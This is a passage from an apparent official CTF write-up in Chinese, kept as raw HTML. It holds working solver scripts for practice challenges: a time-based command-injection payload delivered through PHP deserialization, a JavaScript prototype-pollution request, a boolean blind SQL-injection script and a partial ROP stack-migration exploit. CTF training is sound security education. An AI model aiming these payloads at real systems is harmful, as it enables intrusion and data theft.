class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):</div><div line="1g4V" data-language="python" class="ql-code-block ql-word-wrap-true">        <span class="hljs-comment">#ascii码表</span></div><div line="w9ST" data-language="python" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):</div><div line="VQlo" data-language="python" class="ql-code-block ql-word-wrap-true">            k=<span class="hljs-built_in">chr</span>(k)</div><div line="kBej" data-language="python" class="ql-code-block ql-word-wrap-true">            payload =<span class="hljs-string">f"if [ `cat /flag_is_h3eeere | awk NR==<span class="hljs-subst">{i}</span> | cut -c <span class="hljs-subst">{j}</span>` == '<span class="hljs-subst">{k}</span>' ];then sleep 2;fi"</span></div><div line="fdRs" data-language="python" class="ql-code-block ql-word-wrap-true">            length=<span class="hljs-built_in">len</span>(payload)</div><div line="tKv1" data-language="python" class="ql-code-block ql-word-wrap-true">            payload2 ={</div><div line="nvvO" data-language="python" class="ql-code-block ql-word-wrap-true">                <span class="hljs-string">"payload"</span>: <span class="hljs-string">'O:7:"minipop":2:{{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{{s:4:"code";s:{0}:"{1}";s:13:"qwejaskdjnlka";N;}}}}'</span>.<span class="hljs-built_in">format</span>(length,payload)</div><div line="cjCp" data-language="python" class="ql-code-block ql-word-wrap-true">            }</div><div line="ZfiZ" data-language="python" class="ql-code-block ql-word-wrap-true">            t1=time.time()</div><div line="OWyL" data-language="python" class="ql-code-block ql-word-wrap-true">            r=requests.post(url=url,data=payload2)</div><div line="Jmy2" data-language="python" class="ql-code-block ql-word-wrap-true">            t2=time.time()</div><div line="xb6p" data-language="python" class="ql-code-block ql-word-wrap-true">            <span class="hljs-keyword">if</span> t2-t1 &gt;<span class="hljs-number">1.5</span>:</div><div line="9txO" data-language="python" class="ql-code-block ql-word-wrap-true">                result+=k</div><div line="vuRG" data-language="python" class="ql-code-block ql-word-wrap-true">                <span class="hljs-built_in">print</span>(result)</div><div line="8OaM" data-language="python" class="ql-code-block ql-word-wrap-true">    result += <span class="hljs-string">" "</span></div></div><p ql-global="true" line="MHxv"><br></p><h1><div ql-global="true" line="ceOR" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>OtenkiGirl</div></h1><ul data-list-style="circle"><li ql-global="true" line="rre4" class="bullet-item"><strong>考点</strong>：JavaScript 原型链污染（<code class="ql-inlinecode">__proto__</code>）</li></ul><ul data-list-style="circle"><li ql-global="true" line="k22P" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="QVId" class="bullet-item"><strong>解题步骤 </strong></li></ul><p ql-global="true" line="YyJj">特地写了篇文章试图讲清楚 JavaScript 原型链：<a class="ql-link" href="https://www.yuque.com/cnily03/tech/js-prototype-pollution?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow">https://www.yuque.com/cnily03/tech/js-prototype-pollution</a></p><p ql-global="true" line="rK37">随便提交一些信息，通过抓包或者直接查看附件的源码都能发现下面两个请求地址：</p><ul data-list-style="circle"><li ql-global="true" line="JZR5" class="bullet-item">获取全部信息</li></ul><div class="ql-code-block-container" data-language="json" spellcheck="false"><div line="LuWV" data-language="json" class="ql-code-block">POST /info/<span class="hljs-number">0</span> HTTP/<span class="hljs-number">1.1</span></div><div line="2NEO" data-language="json" class="ql-code-block">Content-Type<span class="hljs-punctuation">:</span> application/x-www-form-urlencoded</div></div><p ql-global="true" line="8UJj" class="ql-text-indent-1">可以改变<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">0</span></code>的值就是获取到指定时间戳之后的信息</p><ul data-list-style="circle"><li ql-global="true" line="2G2I" class="bullet-item">提交信息</li></ul><div class="ql-code-block-container" data-language="json" spellcheck="false"><div line="boyq" data-language="json" class="ql-code-block">POST /submit HTTP/<span class="hljs-number">1.1</span></div><div line="1gMg" data-language="json" class="ql-code-block">Content-Type<span class="hljs-punctuation">:</span> application/json</div></div><p ql-global="true" line="4t2d" class="ql-text-indent-1">提交信息必须为 JSON 格式，<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">contact</span></code>和<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">reason</span></code>字段是必须的，例如</p><div class="ql-code-block-container" data-language="json" spellcheck="false"><div line="19Tb" data-language="json" class="ql-code-block">POST /submit HTTP/<span class="hljs-number">1.1</span></div><div line="CRkn" data-language="json" class="ql-code-block">Content-Type<span class="hljs-punctuation">:</span> application/json</div><div line="Kbs6" data-language="json" class="ql-code-block"><br></div><div line="NS2M" data-language="json" class="ql-code-block"><span class="hljs-punctuation">{</span></div><div line="QdC8" data-language="json" class="ql-code-block">  <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span></div><div line="xtZl" data-language="json" class="ql-code-block">  <span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"test"</span></div><div line="RQYX" data-language="json" class="ql-code-block"><span class="hljs-punctuation">}</span></div></div><p ql-global="true" line="glRr" class="ql-text-indent-1">响应</p><div class="ql-code-block-container" data-language="json" spellcheck="false"><div line="DfYD" data-language="json" class="ql-code-block">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK</div><div line="zZFA" data-language="json" class="ql-code-block">connection<span class="hljs-punctuation">:</span> close</div><div line="mFKg" data-language="json" class="ql-code-block">content-length<span class="hljs-punctuation">:</span> <span class="hljs-number">159</span></div><div line="16oS" data-language="json" class="ql-code-block">content-type<span class="hljs-punctuation">:</span> application/json; charset=utf<span class="hljs-number">-8</span></div><div line="3LmN" data-language="json" class="ql-code-block">date<span class="hljs-punctuation">:</span> Sun<span class="hljs-punctuation">,</span> <span class="hljs-number">24</span> Sep <span class="hljs-number">2023</span> <span class="hljs-number">07</span><span class="hljs-punctuation">:</span><span class="hljs-number">09</span><span class="hljs-punctuation">:</span><span class="hljs-number">54</span> GMT</div><div line="R8aR" data-language="json" class="ql-code-block">server<span class="hljs-punctuation">:</span> openresty</div><div line="fzQc" data-language="json" class="ql-code-block"><br></div><div line="w8g4" data-language="json" class="ql-code-block"><span class="hljs-punctuation">{</span></div><div line="8bo9" data-language="json" class="ql-code-block">  <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span></div><div line="qE5m" data-language="json" class="ql-code-block">  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span></div><div line="ZNCj" data-language="json" class="ql-code-block">    <span class="hljs-attr">"wishid"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2Tn69Yq5hBbTwLdihWZfdKVF"</span><span class="hljs-punctuation">,</span></div><div line="EjOS" data-language="json" class="ql-code-block">    <span class="hljs-attr">"date"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"unknown"</span><span class="hljs-punctuation">,</span></div><div line="jvWE" data-language="json" class="ql-code-block">    <span class="hljs-attr">"place"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"unknown"</span><span class="hljs-punctuation">,</span></div><div line="u8iN" data-language="json" class="ql-code-block">    <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span></div><div line="ymly" data-language="json" class="ql-code-block">    <span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span></div><div line="jrs6" data-language="json" class="ql-code-block">    <span class="hljs-attr">"timestamp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1695539394820</span></div><div line="Whxu" data-language="json" class="ql-code-block">  <span class="hljs-punctuation">}</span></div><div line="WJqR" data-language="json" class="ql-code-block"><span class="hljs-punctuation">}</span></div></div><p ql-global="true" line="OSAi">查看<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">routes/info.js</span></code>源码，考察从数据库中获取数据的函数<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">getInfo</span></code></p><div class="ql-code-block-container" data-language="javascript" word-wrap="" spellcheck="false"><div line="T4Sv" data-language="javascript" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) {</div><div line="Wx9M" data-language="javascript" class="ql-code-block ql-word-wrap-true">    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">"number"</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();</div><div line="WRRc" data-language="javascript" class="ql-code-block ql-word-wrap-true">    <span class="hljs-comment">// Remove test data from before the movie was released</span></div><div line="LX64" data-language="javascript" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();</div><div line="z93c" data-language="javascript" class="ql-code-block ql-word-wrap-true">    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);</div><div line="j9jS" data-language="javascript" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> { <span class="hljs-keyword">throw</span> e });</div><div line="ZmnR" data-language="javascript" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">return</span> data;</div><div line="5bzg" data-language="javascript" class="ql-code-block ql-word-wrap-true">}</div></div><p ql-global="true" line="ynQd">其中第4行和第5行将我们传入的<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">timestamp</span></code>做了一个过滤，使得所返回的数据不早于配置文件中的<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">min_public_time</span></code></p><p ql-global="true" line="nG03">查看根目录下的<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">config.js</span></code>和<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">config.default.js</span></code>后发现<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">config.js</span></code>并没有配置<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">min_public_time</span></code>，因此<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">getInfo</span></code>的第5行只是采用了<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">DEFAULT_CONFIG.min_public_time</span></code></p><p ql-global="true" line="Fcpt">考虑原型链污染污染<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">min_public_time</span></code>为我们想要的日期，就能绕过最早时间限制，获取任意时间的数据</p><p ql-global="true" line="nOXe">查看<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">routes/submit.js</span></code>源码，发现注入点</p><div class="ql-code-block-container" data-language="javascript" word-wrap="" spellcheck="false"><div line="zDaw" data-language="javascript" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; {</div><div line="0Vj8" data-language="javascript" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">"object"</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">"object"</span>) <span class="hljs-keyword">return</span> dst;</div><div line="kQrV" data-language="javascript" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) {</div><div line="hNuR" data-language="javascript" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) {</div><div line="hdPI" data-language="javascript" class="ql-code-block ql-word-wrap-true">            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);</div><div line="kWJh" data-language="javascript" class="ql-code-block ql-word-wrap-true">        } <span class="hljs-keyword">else</span> {</div><div line="8leT" data-language="javascript" class="ql-code-block ql-word-wrap-true">            dst[key] = src[key];</div><div line="lCsC" data-language="javascript" class="ql-code-block ql-word-wrap-true">        }</div><div line="vdus" data-language="javascript" class="ql-code-block ql-word-wrap-true">    }</div><div line="GE60" data-language="javascript" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">return</span> dst;</div><div line="wnXF" data-language="javascript" class="ql-code-block ql-word-wrap-true">}</div><div line="pOVv" data-language="javascript" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));</div></div><p ql-global="true" line="usmr">其中<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">merge</span></code>函数第7行存在原型链污染，因此只要考虑注入<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">data['__proto__']['min_public_time']</span></code>的值即可</p><p ql-global="true" line="1Tuj">于是构造<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">payload</span></code></p><div class="ql-code-block-container" data-language="json" spellcheck="false"><div line="ndnl" data-language="json" class="ql-code-block">POST /submit HTTP/<span class="hljs-number">1.1</span></div><div line="uLwC" data-language="json" class="ql-code-block">Content-Type<span class="hljs-punctuation">:</span> application/json</div><div line="pQTH" data-language="json" class="ql-code-block"><br></div><div line="ZXF0" data-language="json" class="ql-code-block"><span class="hljs-punctuation">{</span></div><div line="3ZMP" data-language="json" class="ql-code-block">  <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span></div><div line="qt8z" data-language="json" class="ql-code-block">  <span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span></div><div line="c3Vh" data-language="json" class="ql-code-block">  <span class="hljs-attr">"__proto__"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span></div><div line="l2kl" data-language="json" class="ql-code-block">    <span class="hljs-attr">"min_public_time"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1001-01-01"</span></div><div line="OCMB" data-language="json" class="ql-code-block">  <span class="hljs-punctuation">}</span></div><div line="sZG2" data-language="json" class="ql-code-block"><span class="hljs-punctuation">}</span><span class="hljs-number">000000</span> </div></div><p ql-global="true" line="f9vZ">然后为我们再请求<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">/info/0</span></code>，就能得到更多的数据，其中一条是</p><div class="ql-code-block-container" data-language="json" word-wrap="" spellcheck="false"><div line="RAFQ" data-language="json" class="ql-code-block ql-word-wrap-true"><span class="hljs-punctuation">{</span></div><div line="z8eg" data-language="json" class="ql-code-block ql-word-wrap-true">  <span class="hljs-attr">"wishid"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"L6VFppr6GDqYPELMGTNTeNZ6"</span><span class="hljs-punctuation">,</span></div><div line="HZeI" data-language="json" class="ql-code-block ql-word-wrap-true">  <span class="hljs-attr">"date"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2021-09-27"</span><span class="hljs-punctuation">,</span></div><div line="WgO7" data-language="json" class="ql-code-block ql-word-wrap-true">  <span class="hljs-attr">"place"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"学園都市"</span><span class="hljs-punctuation">,</span></div><div line="AVLq" data-language="json" class="ql-code-block ql-word-wrap-true">  <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"御坂美琴"</span><span class="hljs-punctuation">,</span></div><div line="gqdH" data-language="json" class="ql-code-block ql-word-wrap-true">  <span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag{2696dfcb-5628-41a2-8947-f3f6c59aab8f}です"</span><span class="hljs-punctuation">,</span></div><div line="uNAy" data-language="json" class="ql-code-block ql-word-wrap-true">  <span class="hljs-attr">"timestamp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1190726040113</span></div><div line="FVNg" data-language="json" class="ql-code-block ql-word-wrap-true"><span class="hljs-punctuation">}</span></div></div><p ql-global="true" line="0GMW">得到 flag</p><div class="ql-code-block-container" data-language="plain" spellcheck="false"><div line="DlAr" data-language="plain" class="ql-code-block">flag{2696dfcb-5628-41a2-8947-f3f6c59aab8f}</div></div><p ql-global="true" line="FdY5"><strong>注意：</strong>在提交 payload 的请求后直接刷新网页并不会获取到上面的数据，这是因为网页启用了缓存，会发送本地缓存中最晚时间的<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">info</span></code>请求。如果想要通过刷新网页获取数据，只需要在<code class="ql-inlinecode"><span style="background: rgba(0, 0, 0, 0.06);">开发者工具 -&gt; 应用程序 -&gt; 存储</span></code>中清除网站数据然后刷新网页即可。</p><p ql-global="true" line="cDUT"><br></p><h1><div ql-global="true" line="s18y" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>medium_sql</div></h1><ul data-list-style="circle"><li ql-global="true" line="Bh5O" class="bullet-item"><strong>考点</strong>：布尔盲注</li></ul><ul data-list-style="circle"><li ql-global="true" line="Szhu" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="bIRz" class="bullet-item"><strong>解题步骤 </strong></li></ul><p ql-global="true" line="i5CD">在week1的基础上，多过滤了union。</p><p ql-global="true" line="EoSZ">验证存在布尔盲注：</p><p ql-global="true" line="LkIX">?id=TMP0919' And if(1&gt;0,1,0)#</p><p ql-global="true" line="Hg9F">?id=TMP0919' And if(0&gt;1,1,0)#</p><p ql-global="true" line="fV1R">发第一个，有回显，第二个，没回显，说明页面可以根据if判断的结果回显两种（真假）内容，因此是布尔盲注。</p><p ql-global="true" line="1RLx"><br></p><p ql-global="true" line="2Td9">盲注脚本，用二分查找。（不会二分查找也没事，可以尝试自己写，反正初学别用sqlmap）</p><div class="ql-code-block-container" data-language="plain" spellcheck="false"><div line="m7aj" data-language="plain" class="ql-code-block"><br></div><div line="gAM9" data-language="plain" class="ql-code-block">def condition(res):</div><div line="FWke" data-language="plain" class="ql-code-block">    if 'Physics' in res.text:</div><div line="bqC0" data-language="plain" class="ql-code-block">        return True</div><div line="53zj" data-language="plain" class="ql-code-block">    return False</div><div line="u7yo" data-language="plain" class="ql-code-block">result = ''</div><div line="Slhb" data-language="plain" class="ql-code-block">_url = 'http://f805b478-bdd8-4fc6-98b2-155a3ac3d560.node4.buuoj.cn:81/'</div><div line="Gh4t" data-language="plain" class="ql-code-block">import time</div><div line="mCRK" data-language="plain" class="ql-code-block">for _time in range(1,1000):</div><div line="mkqf" data-language="plain" class="ql-code-block">    print("time:%d" % (_time)) </div><div line="DR9p" data-language="plain" class="ql-code-block">    left = 32</div><div line="XyOD" data-language="plain" class="ql-code-block">    right = 128</div><div line="Nc7X" data-language="plain" class="ql-code-block">    while (right &gt; left):</div><div line="UPWV" data-language="plain" class="ql-code-block">        mid = (left + right) // 2</div><div line="Kmzc" data-language="plain" class="ql-code-block">        # 获取当前库表名</div><div line="e7nR" data-language="plain" class="ql-code-block">        # url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))In({mid})),1,0)%23"</div><div line="8lHC" data-language="plain" class="ql-code-block">        # 获取字段名</div><div line="rSoF" data-language="plain" class="ql-code-block">        # url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))In({mid})),1,0)%23"</div><div line="5c8u" data-language="plain" class="ql-code-block">        # 获取字段值</div><div line="lWtV" data-language="plain" class="ql-code-block">        url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))In({mid})),1,0)%23"</div><div line="L4pL" data-language="plain" class="ql-code-block">        </div><div line="mD8t" data-language="plain" class="ql-code-block">        # 防止请求速率过快</div><div line="OoKa" data-language="plain" class="ql-code-block">        time.sleep(0.2)</div><div line="oXlu" data-language="plain" class="ql-code-block">        res = requests.get(url=url)</div><div line="ea0J" data-language="plain" class="ql-code-block">        if (condition(res)):</div><div line="5bRT" data-language="plain" class="ql-code-block">            result += chr(mid)</div><div line="ES1i" data-language="plain" class="ql-code-block">            print(result)</div><div line="ijmP" data-language="plain" class="ql-code-block">            break</div><div line="oSHw" data-language="plain" class="ql-code-block">        else:</div><div line="iOj6" data-language="plain" class="ql-code-block">            # 获取当前库表名</div><div line="A7mw" data-language="plain" class="ql-code-block">            # url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23"</div><div line="ih77" data-language="plain" class="ql-code-block">            # 获取字段名</div><div line="zwbl" data-language="plain" class="ql-code-block">            # url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23"</div><div line="FwEQ" data-language="plain" class="ql-code-block">            #获取字段值</div><div line="6Lw8" data-language="plain" class="ql-code-block">            url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23"</div><div line="BoRc" data-language="plain" class="ql-code-block">            res = requests.get(url=url)</div><div line="1NSr" data-language="plain" class="ql-code-block">            if (condition(res)):</div><div line="POlr" data-language="plain" class="ql-code-block">                left = mid</div><div line="BEQW" data-language="plain" class="ql-code-block">            else:</div><div line="Wik8" data-language="plain" class="ql-code-block">                right = mid</div><div line="GmkU" data-language="plain" class="ql-code-block"><br></div></div><p ql-global="true" line="kZo1"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="795" height="auto" ori-width="795" src="./NewStarCTF 2023 Week3 官方WriteUp_files/1697287558171.png" ori-height="735" data-src="https://uploader.shimo.im/f/TIt2yvGKFnVQb90i.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="H26x"><br></p><p ql-global="true" line="YTT1"><br></p><p ql-global="true" line="ECRW"><br></p><p ql-global="true" line="Siyq"><br></p><p ql-global="true" class="ql-align-center ql-heading-title" line="Tj85" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Pwn</p><h1><div ql-global="true" line="AKGc" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>stack_migration_revenge</div></h1><ul data-list-style="circle"><li ql-global="true" line="M2bJ" class="bullet-item"><strong>考点</strong>：栈迁移进阶</li></ul><ul data-list-style="circle"><li ql-global="true" line="fPrg" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="PzSK" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="BUzZ">只能溢出0x10字节，可以控制rbp和rip，没有给出栈地址，但是没开pie，也就是bss地址是已知的</p><p ql-global="true" line="3jUo">可以劫持rbp到bss上为下一次栈迁移做准备，然后复用可溢出函数的read可以再次溢出，在buffer写rop，利用溢出进行栈迁移到buffer处</p><p ql-global="true" line="ED6p">但是由于用rop里的puts leak后，rdx会置为0，所以需要再次利用函数里的read进行栈迁移，利用思路同上，可以用pop_rbp_ret来劫持rbp</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="IBlu" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="t7jf" data-language="python" class="ql-code-block ql-word-wrap-true">context.update(os = <span class="hljs-string">'linux'</span>,arch = <span class="hljs-string">'amd64'</span>)</div><div line="JHn9" data-language="python" class="ql-code-block ql-word-wrap-true">context.log_level = <span class="hljs-string">'debug'</span></div><div line="TJIW" data-language="python" class="ql-code-block ql-word-wrap-true">binary = <span class="hljs-string">'./revenge'</span></div><div line="I1Er" data-language="python" class="ql-code-block ql-word-wrap-true">elf = ELF(binary)</div><div line="bknM" data-language="python" class="ql-code-block ql-word-wrap-true">libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)</div><div line="urBb" data-language="python" class="ql-code-block ql-word-wrap-true">DEBUG = <span class="hljs-number">1</span></div><div line="esc6" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">if</span> DEBUG:</div><div line="5DmL" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; libc = elf.libc</div><div line="gnvX" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; p = process(binary)</div><div line="VpNS" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">else</span>:</div><div line="gkVO" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; host = <span class="hljs-string">'127.0.0.1'</span></div><div line="kTtD" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; port = <span class="hljs-string">'1145'</span></div><div line="H8YG" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; p = remote(host,port)</div><div line="ARHK" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="UeYn" data-language="python" class="ql-code-block ql-word-wrap-true">bss = elf.bss(<span class="hljs-number">0x700</span>)</div><div line="tHVa" data-language="python" class="ql-code-block ql-word-wrap-true">pop_rdi_ret = <span class="hljs-number">0x00000000004012b3</span></div><div line="asPG" data-language="python" class="ql-code-block ql-word-wrap-true">pop_rbp_ret = <span class="hljs-number">0x000000000040115d</span></div><div line="t1dM" data-language="python" class="ql-code-block ql-word-wrap-true">leave_ret = <span class="hljs-number">0x0000000000401227</span></div><div line="UGSA" data-language="python" class="ql-code-block ql-word-wrap-true">ret = <span class="hljs-number">0x000000000040101a</span></div><div line="AbD7" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="BvPD" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">"just chat with me:\n"</span>)</div><div line="VF4j" data-language="python" class="ql-code-block ql-word-wrap-true">pay = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x50</span> + p64(bss + <span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0x4011F3</span>)</div><div line="vSHF" data-language="python" class="ql-code-block ql-word-wrap-true">p.send(pay)</div><div line="4029" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="P4OY" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">"just chat with me:\n"</span>)</div><div line="iblV" data-language="python" class="ql-code-block ql-word-wrap-true">pay = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">"puts"</span>]) + p64(elf.plt[<span class="hljs-string">"puts"</span>])</div><div line="S2Tc" data-language="python" class="ql-code-block ql-word-wrap-true">pay += p64(pop_rbp_ret) + p64(bss + <span class="hljs-number">0x50</span> + <span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x4011F3</span>)</div><div line="QEHS" data-language="python" class="ql-code-block ql-word-wrap-true">pay = pay.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b'\x00'</span>) + p64(bss - <span class="hljs-number">0x8</span>) + p64(leave_ret)</div><div line="9SOs" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># gdb.attach(p, "b *0x401227")</span></div><div line="EItz" data-language="python" class="ql-code-block ql-word-wrap-true">p.send(pay)</div><div line="xJTc" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="SazJ" data-language="python" class="ql-code-block ql-word-wrap-true">libc.address = u64(p.recvuntil(<span class="hljs-string">b'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>)) - libc.sym[<span class="hljs-string">"puts"</span>]</div><div 